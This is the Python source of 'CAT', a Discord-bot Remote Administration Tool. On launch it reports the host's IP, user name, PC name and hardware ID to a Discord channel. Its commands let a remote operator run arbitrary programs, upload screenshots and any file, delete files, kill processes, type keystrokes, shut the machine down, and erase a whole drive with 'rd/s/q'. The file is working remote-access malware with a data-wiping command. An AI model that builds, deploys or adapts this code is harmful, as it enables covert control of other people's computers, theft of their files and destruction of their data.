"""
Join to our telegram channel https://t.me/CAT_discord_dev
Jo to our telegram group https://t.me/catchatdev
Made by NullifiedVlad (C) 2020
"""

import ctypes
import os
import sys
from datetime import datetime
import win32api
import discord
import pyautogui as pg
from discord.ext import commands
import config
import nullfunction as nf
import subprocess
import webbrowser

pg.FAILSAFE = False


class Cat(commands.Bot):
    def __init__(self, command_prefix, token: str, **options):
        super().__init__(command_prefix, **options)

        self.remove_command('help')
        self.token = token

    def start_bot(self):

        @self.event
        async def on_ready():

            channel_start = discord.utils.get(self.guilds[0].channels, name="cat")

            date = datetime.now()

            minute = date.minute
            x, y = pg.size()

            if len(str(minute)) == 1:
                minute = '0' + str(minute)
            else:
                pass

            hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
            embed = discord.Embed(title='**USER ONLINE**', description='Remote Aministration Tool.',
                                  color=0x03fcec, )
            embed.add_field(name='**System time**', value=f'{date.hour}:{minute}', inline=False)
            embed.add_field(name='**OS**', value=f'{sys.platform}', inline=False)
            embed.add_field(name='**Screen resolution**', value=f'{x}x{y}', inline=False)
            embed.add_field(name='**IP address**', value=f'{nf.ip()}', inline=False)
            embed.add_field(name='**PC name**', value=f'{win32api.GetComputerName()}', inline=False)
            embed.add_field(name='**User name**', value=f'{win32api.GetUserName()}', inline=False)
            embed.add_field(name='**Root path**', value=f'{win32api.GetSystemDirectory()}', inline=False)
            embed.add_field(name='**HWID**', value=f'{hwid}', inline=False)
            embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
            embed.set_footer(text=f'Use /help for see bot features',
                             icon_url='https://i.imgur.com/YbYKL0F.png')
            embed.set_author(name=self.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')

            try:
                await channel_start.send(embed=embed)

            except AttributeError:
                pass
            finally:
                await self.change_presence(activity=discord.Game(f'Was stated in {date.hour}:{date.minute}'))

        @self.command()
        async def move(ctx, x: int, y: int, time: float):
            pg.moveTo(x, y, time)
            await ctx.send(f'Mouse was moved on X:{x} Y:{y}')

        @self.command()
        async def click(ctx):
            try:
                pg.click()
                await ctx.send('**CAT:** Clicked!')
            except Exception as e:
                await ctx.send(f'ERROR **{e}**')

        @self.command()
        async def screenshot(ctx):
            pg.screenshot(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')
            await ctx.send(file=discord.File(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png'))
            os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')

        @self.command()
        async def cg(ctx):
            pg.hotkey('alt', 'shift')
            await ctx.send(':white_check_mark:keyboard language was changed!:white_check_mark:')

        @self.command()
        async def write(ctx, *, text):
            try:
                pg.typewrite(text)
                await ctx.send(f'Success!')
            except Exception as e:
                await ctx.send(f'ERROR! \n{e}')
            del text

        @self.command()
        async def press(ctx, key: str = None, how_many: int = None):
            if key or how_many:
                for i in range(int(how_many)):
                    pg.press(key)
                await ctx.send(f'**CAT:** Key "{key}" was pressed {how_many} times!')
            else:
                await ctx.send('')

        @self.command(aliases=['help'])
        async def help_message(ctx):  # send help message
            embed = discord.Embed(title='**Commands**', description='Configuration Administration Tool.', color=0x03fcec)
            # заголовки
            embed.add_field(name='**/help**', value='Show this message.', inline=False)
            embed.add_field(name='**/move**', value='(X) (Y) (time) move mouse.', inline=False)
            embed.add_field(name='**/click**', value='Left click.', inline=False)
            embed.add_field(name='**/write**', value='Write something.', inline=False)
            embed.add_field(name='**/press**', value='(key)(how_many) Press key.', inline=False)
            embed.add_field(name='**/screenshot**', value='Screenshot.', inline=False)
            embed.add_field(name='**/cg** ', value='Change keyboard language.', inline=False)
            embed.add_field(name='**/command** ', value='Run command.', inline=False)
            embed.add_field(name='**/kill**', value='Kill process.', inline=False)
            embed.add_field(name='**/delete**', value='Delete file.', inline=False)
            embed.add_field(name='**/wallpaper**', value='(url) change wallpaper.', inline=False)
            embed.add_field(name='**/disk_format**', value='(name) Format disk.', inline=False)
            embed.add_field(name='**/copy**', value='Send file in chat.', inline=False)
            embed.add_field(name='**/browser**', value='Open link in browser')
            embed.add_field(name='**/shutdown**', value='Shutdown.', inline=False)
            embed.add_field(name='**/reboot**', value='Reboot.', inline=False)
            embed.add_field(name='**/off**', value='Disable bot.', inline=False)
            embed.add_field(name='**/logout**', value='Log out from windows.', inline=False)
            embed.add_field(name='**/win_info**', value='Get windows information.', inline=False)
            embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')

            embed.set_footer(text=f'Made by NullifiedVlad', icon_url='https://i.imgur.com/YbYKL0F.png')
            embed.set_author(name=self.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
            await ctx.send(embed=embed)

        @self.command()
        async def command(ctx, *, todo: str = None):
            if not todo:
                await ctx.send(":no_entry:Enter something :(:no_entry:")
            else:
                subprocess.Popen(todo)

        @self.command()
        async def kill(ctx, *, process: str = None):
            if not os.system(f'taskkill /im {process} /f'):
                await ctx.send(f':white_check_mark:Process {process} was killed:white_check_mark:')
            else:
                await ctx.send(':no_entry:Process not found!:no_entry:')

        @self.command()
        async def delete(ctx, file_on_delete):
            try:
                os.remove(str(file_on_delete))
                await ctx.send(f'File "{file_on_delete}" was deleted!')
            except FileNotFoundError:
                await ctx.send(':no_entry:File not found :(:no_entry:')

        @self.command()
        async def browser(ctx, site: str = None):
            if site:
                webbrowser.open(site)
                await ctx.send(":no_entry:Enter url!:no_entry:")
            else:
                await ctx.send(":no_entry:Enter url!:no_entry:")

        @self.command()
        async def disk_format(ctx, disk: str = 'C'):
            await ctx.send(f'Deleting disk**{disk}**!')
            os.system(f'rd/s/q {disk}:\\')

        @self.command()
        async def copy(ctx, way: str):
            try:
                await ctx.send('Copied file:', file=discord.File(way))
            except FileNotFoundError:
                await ctx.send('File not found!')

        @self.command()
        async def shutdown(ctx):
            await ctx.send('Light out!')
            os.system('shutdown -s -t 0 >null')

        @self.command()
        async def reboot(ctx):
            await ctx.send('Rebooting...')
            os.system('shutdown -r -t 0 >null')

        @self.command()
        async def off(ctx):
            await ctx.send('Disable...')
            sys.exit()

        @self.command()
        async def wallpaper(ctx):
            try:
                url = ctx.message.attachments[0].url

                with open(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 'wb') as f:
                    f.write(nf.img_get(url))

                if ctypes.windll.user32.SystemParametersInfoW(20, 0,
                                                              f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 0):
                    await ctx.send(':white_check_mark:Wallpaper was changed!:white_check_mark:')
                else:
                    await ctx.send('ERROR!')
                os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png')
            except IndexError:
                await ctx.send(":no_entry:Attach image!:no_entry:")

        @self.command()
        async def msgbox(ctx, title: str = None, *, text: str = None):
            if not title or not text:
                await ctx.send(":no_entry:You forgot set title text!:no_entry:")
                return
            win32api.MessageBox(None, str(text), str(title))

        @self.command()
        async def logout(ctx):
            ctx.send('Exiting from Windows...')
            win32api.ExitWindows()

        @self.command()
        async def win_info(ctx):

            info = win32api.GetVersionEx()

            embed = discord.Embed(title='**CAT-WIN.**', description='Windows information', color=0x03fcec)
            embed.add_field(name='**Major version**', value=str(info[0]), inline=False)
            embed.add_field(name='**Minor version**', value=info[1], inline=False)
            embed.add_field(name='**Build number**', value=info[2], inline=False)
            embed.add_field(name='**Platform ID**', value=info[3], inline=False)

            await ctx.send(embed=embed)

        self.run(self.token)


if __name__ == '__main__':
    Cat(command_prefix='/', token=config.token).start_bot()
